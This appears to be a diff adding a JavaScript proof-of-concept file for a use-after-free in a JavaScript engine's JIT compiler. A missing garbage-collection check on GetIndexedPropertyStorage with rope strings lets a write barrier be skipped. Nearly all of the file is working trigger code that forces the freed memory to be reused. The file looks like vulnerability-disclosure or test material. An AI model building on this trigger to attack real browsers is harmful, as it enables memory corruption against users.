@@ -1,0 +1,58 @@
+/*
+The doesGC function simply takes a node, and tells if it might cause a garbage collection. This function is used to determine whether to insert write barriers. But it's missing GetIndexedPropertyStorage that can cause a garbage collection via rope strings. As a result, it can lead to UaF.
+
+PoC:
+*/
+
+function gc() {
+    for (let i = 0; i < 10; i++) {
+        new ArrayBuffer(1024 * 1024 * 10);
+    }
+}
+
+function opt(arr) {
+    let r = /a/;
+    let o = {};
+
+    arr[0].charAt(0);
+    arr[1].charAt(0);
+    arr[2].charAt(0);
+    arr[3].charAt(0);
+    arr[4].charAt(0);
+    arr[5].charAt(0);
+    arr[6].charAt(0);
+    arr[7].charAt(0);
+    arr[8].charAt(0);
+    arr[8].charAt(0);
+    arr[9].charAt(0);
+
+    o.x = 'a'.match(r);
+
+    return o;
+}
+
+function main() {
+    for (let i = 0; i < 10000; i++) {
+        opt(['a' + i, 'b' + i, 'c' + i, 'd' + i, 'e' + i, 'f' + i, 'g' + i, 'h' + i, 'i' + i, 'j' + i]);
+    }
+
+    let a = 'a'.repeat(1024 * 1024 * 2);
+    let b = 'a'.repeat(1024 * 1024 * 2);
+
+    let arr = [];
+    for (let i = 0; i < 10; i++) {
+        arr[i] = a + b;
+    }
+
+    gc();
+
+    let o = opt(arr);
+
+    gc();
+
+    let tmp = [1234];
+
+    print(o.x);  // 1234
+}
+
+main();
